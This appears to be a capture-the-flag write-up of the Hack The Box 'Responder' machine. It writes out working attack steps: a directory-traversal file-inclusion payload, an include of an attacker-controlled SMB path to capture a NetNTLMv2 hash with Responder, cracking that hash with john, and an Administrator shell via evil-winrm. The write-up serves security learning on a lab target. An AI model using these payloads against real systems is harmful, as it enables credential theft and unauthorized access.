This box is about "File Inclusion" and "NTLM".

A File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTMLv2 challenge of the user that is running the web server.

Then, we use ```Responder``` to capture the NetNTLMv2 hash and use ```john the ripper``` to crack it.

### Scan
```shell
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p- -T5 10.129.133.83 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 16:50 EDT
Nmap scan report for 10.129.133.83
Host is up (0.017s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub
```

Port 5985 is for WinRM(aka. Windows Remote Management). It's a Windows-native built-in remote management protocol.
It allows the user to:
- Remotely communicate and interface with hosts
- Execute commands remotely on systems that are not local to you but are network accessible
- Monitor, manage and configure servers, operating systems and client machines from a remote location

WinRM can get us a Powershell shell, but first, we need the credentials.

### Enumerate Web App

As we open the browser and search ```[target ip]```, it will say that unable to find that site. That's because the website has redirected the browser to a new url and our host doesn't know how to find it.

That's called **Name-Based Virtual hosting**. It hosts multiple domain names on a single server.

The ```/etc/hosts``` file is used to resolve a hostname into an IP address, so we need to put ip and url into it. Then, it will enable the browser to resolve the hostname and include the HTTP header in every HTTP request.

Then open it in browser.

![webpage](/img/htb/responder-webpage.png)

There's a URL parameter used to load different language versions of the webpage. ```http://unika.htb/index.php?page=french.html```

It uses ```page``` parameter which may potentially be vulnerable to Local File Inclusion vulnerability. A common example is when an application uses the path to a file as input.

Let's try to see if there's a Local File Include vulnerability. We will test with commonly known files. ```http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts```

![lfi](/img/htb/responder-lfi.png)

The file inclusion, in this case, was made possible because in the backend the ```include()``` method of PHP is being used to process the URL parameter ```page``` for serving a different webpage for different languages. And no proper sanitization is being done on the ```page``` parameter.

### Responder Challenge Capture

If we select a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.

**NTLM** is a collection of authentication protocols created by Microsoft. It's a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.

The NTLM authentication process:
- Client sends the user name and domain name to the server
- Server generates a random character string, referred to as the challenge
- Client encrypts the challenge with the NTLM hash of the user password and sends it back to the server
- Server retrieves the user password
- Server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated

**NTHash** aka. NTLM hash, is the output of the algorithm used to store passwords on Windows systems in the SAM database and on domain controllers.

In this case, even if "allow_url_include"(php.ini) is set to "Off", PHP will not prevent the loading of SMB URLs. We can misuse this functionality to steal the NTLM hash.

**Responder**, for this scenario, can set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. Then we could try to crack the hash.

In ```Responder.conf```, make sure "SMB" server is On. Set "HTTP" to Off.
- default system install: /usr/share/responder/Responder.conf

```shell
┌──(kali㉿kali)-[~/htb/responder]
└─$ sudo responder -I tun0                    
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    <SNIP>

[+] Listening for events...                                                                                         
```
While ```sudo responder -I tun0```, try ```http://unika.htb/index.php?page=//10.10.15.233/test.txt```.

This means we tell the server to include a resource from our SMB server.

### Hash Cracking

Yes, we received a NetNTLM for Administrator. Use john to crack it.

```shell
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.133.83
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1383b0de10246165:58C9499A416F36063639759E3B1B840C:01010000000000008024AC581175D8017B4993E4DA3BF5020000000002000800390047003500360001001E00570049004E002D005A003100550041004B0050004100430044003000500004003400570049004E002D005A003100550041004B005000410043004400300050002E0039004700350036002E004C004F00430041004C000300140039004700350036002E004C004F00430041004C000500140039004700350036002E004C004F00430041004C00070008008024AC581175D801060004000200000008003000300000000000000001000000002000000E532660E0B3E94A0A95DD8868A6245D0A434AF2FD783C430BCA957151CBB81F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200330033000000000000000000
┌──(kali㉿kali)-[~/htb/responder]
└─$ echo "Administrator::RESPONDER:01c2103350fe1a94:84BBC05A3FA53BA54C982A7D4F70110C:0101000000000000803CA3C59F79D801CD456A8246E9F0880000000002000800390046003300570001001E00570049004E002D003100500059005A00320036004D00460055004300430004003400570049004E002D003100500059005A00320036004D0046005500430043002E0039004600330057002E004C004F00430041004C000300140039004600330057002E004C004F00430041004C000500140039004600330057002E004C004F00430041004C0007000800803CA3C59F79D801060004000200000008003000300000000000000001000000002000001F4C5BD2D0203B049F3CE9FD4861BABD7E5F284480775C0A7E8A942F5DDAC24C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380030000000000000000000" > hash.txt
                                                                                                                    
┌──(kali㉿kali)-[~/htb/responder]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-06-06 12:23) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### WinRM Login

We'll connect to the WinRM service. We'll be using [evil-winrm](https://github.com/Hackplayers/evil-winrm)

```shell
┌──(kali㉿kali)-[~/htb/responder]
└─$ nmap -p 5985 -sC -sV unika.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 12:25 EDT
Nmap scan report for unika.htb (10.129.189.216)
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```shell
┌──(kali㉿kali)-[~/htb/responder]
└─$ evil-winrm -u Administrator -p 'badminton' -i 10.129.189.216

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
```